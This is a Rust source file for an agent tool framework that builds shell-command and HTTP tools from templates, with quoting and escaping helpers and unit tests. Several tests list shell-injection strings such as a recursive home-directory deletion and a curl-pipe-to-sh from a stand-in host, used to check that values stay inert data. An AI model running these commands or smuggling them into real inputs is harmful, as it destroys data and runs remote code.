//! Shared, reusable `Tool` impls that the source adapters build tools out of:
//! [`ShellTool`] runs a templated shell command, [`HttpTool`] calls an HTTP
//! endpoint. Both are full `rc_core::Tool`s, so once a source produces one it
//! is indistinguishable from a built-in.

use async_trait::async_trait;
use rc_core::error::{ToolError, ToolResult};
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{Tool, ToolContext, ToolSourceKind};
use serde::{Deserialize, Serialize};
use serde_json::Value;

// ─── ShellTool ───────────────────────────────────────────────────────────────

/// A tool backed by a shell command template. `{{param}}` placeholders are
/// substituted with the stringified parameter values, then the command runs
/// under `sh -c`. This is the engine behind the `declarative`, `cli`, `mcp`
/// and `marketplace` sources, and behind LLM-generated tools.
///
/// # Value contract
///
/// Every substituted value is passed through [`shell_quote`], so a parameter
/// value always arrives as **one literal shell word** — it can never break
/// out into shell syntax. Templates must therefore not wrap `{{param}}` in
/// their own quotes; write `printf %s {{msg}}`, not `printf %s "{{msg}}"`.
/// The command itself (the template) always runs — values are data, not
/// code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellTool {
    pub name: String,
    pub description: String,
    pub schema: Schema,
    /// The command template, e.g. `git -C {{repo}} status --porcelain`.
    pub command: String,
    /// Which [`ToolSourceKind`] this tool should report (declarative / cli /
    /// llm_gen / …) — set by the source that built it.
    #[serde(default = "default_source")]
    pub source: String,
    /// Optional working directory for the command.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
}

fn default_source() -> String {
    "declarative".to_string()
}

impl ShellTool {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        schema: Schema,
        command: impl Into<String>,
        source: ToolSourceKind,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            schema,
            command: command.into(),
            source: source.as_str().to_string(),
            cwd: None,
        }
    }

    /// Render the command template: replace `{{name}}` with each param's
    /// stringified value, quoted as a single literal shell word (see
    /// [`shell_quote`]). Missing params are left as-is (the validator
    /// catches required ones earlier).
    fn render(&self, input: &Value) -> String {
        render_template_once(&self.command, &self.schema, input, |v| {
            shell_quote(&stringify(v))
        })
    }
}

fn stringify(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

/// One-pass `{{param}}` substitution: the template is scanned left to right
/// exactly once and each `{{name}}` occurrence is replaced with the already
/// quoted/escaped value. Substituted text is never rescanned, so a value
/// that itself contains `{{...}}` is inert data — it can neither re-expand
/// a later placeholder nor shatter the quoting.
fn render_template_once(
    tmpl: &str,
    schema: &Schema,
    input: &Value,
    quote: impl Fn(&Value) -> String,
) -> String {
    let mut out = String::with_capacity(tmpl.len());
    let mut rest = tmpl;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let Some(end) = after.find("}}") else {
            out.push_str("{{");
            rest = after;
            continue;
        };
        let name = &after[..end];
        let replacement = schema
            .parameters
            .iter()
            .find(|p| p.name == name)
            .and_then(|p| input.get(&p.name))
            .map(|v| quote(v));
        match replacement {
            Some(repl) => out.push_str(&repl),
            // Unknown or missing param: keep the placeholder verbatim.
            None => out.push_str(&rest[start..start + end + 4]),
        }
        rest = &after[end + 2..];
    }
    out.push_str(rest);
    out
}

/// Percent-encode `s` for a URL path/query component: RFC 3986 unreserved
/// bytes stay literal, everything else becomes `%XX` (so `&`, `#`, spaces
/// and quotes can never change the URL's structure).
fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Escape `s` for safe embedding inside a JSON string literal — the body
/// template keeps its own surrounding quotes, so this escapes quotes,
/// backslashes and control characters without adding any.
fn json_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// Quote `s` as a single literal POSIX-shell word: wrap it in single quotes
/// and escape any embedded `'` as `'\''`. Every `{{param}}` value is routed
/// through this at substitution time, so untrusted input is always passed to
/// the command as *data* — `x; rm -rf ~` stays one argument (never three
/// shell commands), and `$(…)`, backticks and quotes lose their shell
/// meaning. The command template itself still runs untouched.
pub fn shell_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            // Close the quote, insert an escaped literal quote, reopen.
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        &self.name
    }
    fn description(&self) -> &str {
        &self.description
    }
    fn schema(&self) -> Schema {
        self.schema.clone()
    }
    fn source(&self) -> ToolSourceKind {
        match self.source.as_str() {
            "cli" => ToolSourceKind::Cli,
            "llm_gen" => ToolSourceKind::LlmGenerated,
            "openapi" => ToolSourceKind::OpenApi,
            "mcp" => ToolSourceKind::Mcp,
            "rest" => ToolSourceKind::Rest,
            "graphql" => ToolSourceKind::GraphQL,
            "marketplace" => ToolSourceKind::Marketplace,
            _ => ToolSourceKind::Declarative,
        }
    }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        if ctx.is_cancelled() {
            return Err(ToolError::Other("cancelled before shell tool".into()));
        }
        let rendered = self.render(input);
        let mut cmd = tokio::process::Command::new("sh");
        cmd.arg("-c").arg(&rendered);
        // If the executor's timeout drops this future, the spawned shell must
        // die with it instead of running on detached.
        cmd.kill_on_drop(true);
        if let Some(cwd) = &self.cwd {
            cmd.current_dir(cwd);
        }
        let output = cmd.output().await.map_err(|e| ToolError::ToolFailed {
            tool: self.name.clone(),
            inner: format!("spawn sh -c: {e}"),
        })?;
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        let code = output.status.code().unwrap_or(-1);
        Ok(serde_json::json!({
            "exit_code": code,
            "stdout": stdout,
            "stderr": stderr,
        }))
    }
}

// ─── HttpTool ────────────────────────────────────────────────────────────────

/// A tool backed by an HTTP call. The URL and (optional) JSON body are
/// templates with `{{param}}` placeholders, substituted from the input. This
/// is the engine behind the `rest` source and the `openapi` source's per-path
/// tools.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpTool {
    pub name: String,
    pub description: String,
    pub schema: Schema,
    /// `GET`, `POST`, …
    pub method: String,
    /// URL template, e.g. `https://api.example.com/users/{{id}}`.
    pub url: String,
    /// Optional JSON body template (for POST/PUT/PATCH).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub body: Option<String>,
    /// Static headers to send.
    #[serde(default)]
    pub headers: Vec<(String, String)>,
    /// Which source kind to report.
    #[serde(default = "default_source")]
    pub source: String,
    /// Maximum bytes of response body to read into memory before
    /// truncating. `None` uses the default cap (1 MiB, matching the
    /// sandbox's default output limit). The cap is enforced *while*
    /// streaming, so an oversized response never lands fully in RAM.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_bytes: Option<usize>,
}

/// Default response-body cap for [`HttpTool`] (bytes).
const DEFAULT_HTTP_MAX_BYTES: usize = 1_000_000;

impl HttpTool {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        schema: Schema,
        method: impl Into<String>,
        url: impl Into<String>,
        source: ToolSourceKind,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            schema,
            method: method.into(),
            url: url.into(),
            body: None,
            headers: Vec::new(),
            source: source.as_str().to_string(),
            max_bytes: None,
        }
    }

    fn render(&self, input: &Value, tmpl: &str, in_url: bool) -> String {
        render_template_once(tmpl, &self.schema, input, |v| {
            let raw = stringify(v);
            if in_url {
                url_encode(&raw)
            } else {
                json_escape(&raw)
            }
        })
    }
}

#[async_trait]
impl Tool for HttpTool {
    fn name(&self) -> &str {
        &self.name
    }
    fn description(&self) -> &str {
        &self.description
    }
    fn schema(&self) -> Schema {
        self.schema.clone()
    }
    fn source(&self) -> ToolSourceKind {
        match self.source.as_str() {
            "openapi" => ToolSourceKind::OpenApi,
            "rest" => ToolSourceKind::Rest,
            "mcp" => ToolSourceKind::Mcp,
            "declarative" => ToolSourceKind::Declarative,
            "marketplace" => ToolSourceKind::Marketplace,
            _ => ToolSourceKind::Rest,
        }
    }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        ctx.check_net()?;
        let url = self.render(input, &self.url, true);
        let mk_err = |e: String| ToolError::ToolFailed {
            tool: self.name.clone(),
            inner: e,
        };
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(20))
            .build()
            .map_err(|e| mk_err(e.to_string()))?;
        let method = reqwest::Method::from_bytes(self.method.as_bytes())
            .map_err(|e| mk_err(format!("bad HTTP method {:?}: {e}", self.method)))?;
        let mut req = client.request(method, &url);
        for (k, v) in &self.headers {
            req = req.header(k, v);
        }
        if let Some(body_tmpl) = &self.body {
            let body = self.render(input, body_tmpl, false);
            // Try to send as JSON; fall back to raw string.
            match serde_json::from_str::<Value>(&body) {
                Ok(v) => {
                    req = req.header("content-type", "application/json").json(&v);
                }
                Err(_) => {
                    req = req.body(body);
                }
            }
        }
        let resp = req.send().await.map_err(|e| mk_err(e.to_string()))?;
        let status = resp.status().as_u16();
        // Stream the body with a running byte counter — never read an
        // unbounded response fully into RAM before applying the cap.
        let cap = self.max_bytes.unwrap_or(DEFAULT_HTTP_MAX_BYTES);
        let mut bytes: Vec<u8> = Vec::with_capacity(8_192);
        let mut truncated = false;
        let mut resp = resp;
        while let Some(chunk) = resp.chunk().await.map_err(|e| mk_err(e.to_string()))? {
            if bytes.len() + chunk.len() > cap {
                let take = cap.saturating_sub(bytes.len());
                bytes.extend_from_slice(&chunk[..take]);
                truncated = true;
                break;
            }
            bytes.extend_from_slice(&chunk);
        }
        let text = String::from_utf8_lossy(&bytes).to_string();
        // Try to parse the body as JSON; fall back to a raw string.
        let body: Value = serde_json::from_str(&text).unwrap_or(Value::String(text));
        Ok(serde_json::json!({
            "status": status,
            "body": body,
            "truncated": truncated,
        }))
    }
}

/// Helper to build a simple single-string-param schema.
pub fn one_string_param(name: &str, desc: &str) -> Schema {
    Schema::new().param(Parameter::required(name, ParamType::String).with_desc(desc))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_render_substitutes() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", "the message"),
            "echo {{msg}}",
            ToolSourceKind::Declarative,
        );
        // Values are quoted into a single literal shell word.
        let rendered = t.render(&serde_json::json!({ "msg": "hello" }));
        assert_eq!(rendered, "echo 'hello'");
    }

    #[test]
    fn shell_quote_is_a_single_literal_word() {
        // `;`, `$()`, backticks and quotes must all be neutralized: the
        // value becomes exactly one argument, never shell syntax.
        for hostile in [
            "x; rm -rf ~",
            "$(curl evil.example/x | sh)",
            "`id` && echo pwned",
            "a'b\"c",
            "a\nb\t c",
            "",
        ] {
            let q = shell_quote(hostile);
            assert!(q.starts_with('\'') && q.ends_with('\''), "not wrapped: {q:?}");
            // The only unquoted `'`s are the escape sequence boundaries.
            let inner = &q[1..q.len() - 1];
            assert!(inner.matches("'\\''").count() == hostile.matches('\'').count());
            assert!(inner.replace("'\\''", "'") == hostile);
        }
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn shell_render_hostile_values_stay_literal() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", "the message"),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        for hostile in ["x; echo PWNED", "$(echo PWNED)", "`echo PWNED`", "a'b\"c"] {
            let rendered = t.render(&serde_json::json!({ "msg": hostile }));
            assert_eq!(rendered, format!("printf %s {}", shell_quote(hostile)));
        }
    }

    #[tokio::test]
    async fn shell_runs_echo() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", ""),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        let out = t
            .execute(&serde_json::json!({ "msg": "hi" }), &ToolContext::default())
            .await
            .unwrap();
        assert_eq!(out["exit_code"], 0);
        assert_eq!(out["stdout"], "hi");
    }

    #[tokio::test]
    async fn shell_injection_payloads_are_data_not_code() {
        // The injection payloads from the security review must reach the
        // command as one literal argument and be echoed back verbatim —
        // the command still runs, the value is never interpreted as shell.
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", ""),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        for hostile in [
            "x; echo PWNED",
            "x && echo PWNED",
            "$(echo PWNED)",
            "`echo PWNED`",
            "x | sh",
        ] {
            let out = t
                .execute(&serde_json::json!({ "msg": hostile }), &ToolContext::default())
                .await
                .unwrap();
            assert_eq!(out["exit_code"], 0, "payload {hostile:?}");
            assert_eq!(out["stdout"], hostile, "payload {hostile:?}");
            assert!(!out["stdout"].as_str().unwrap().contains("PWNED\n"));
        }
    }
}
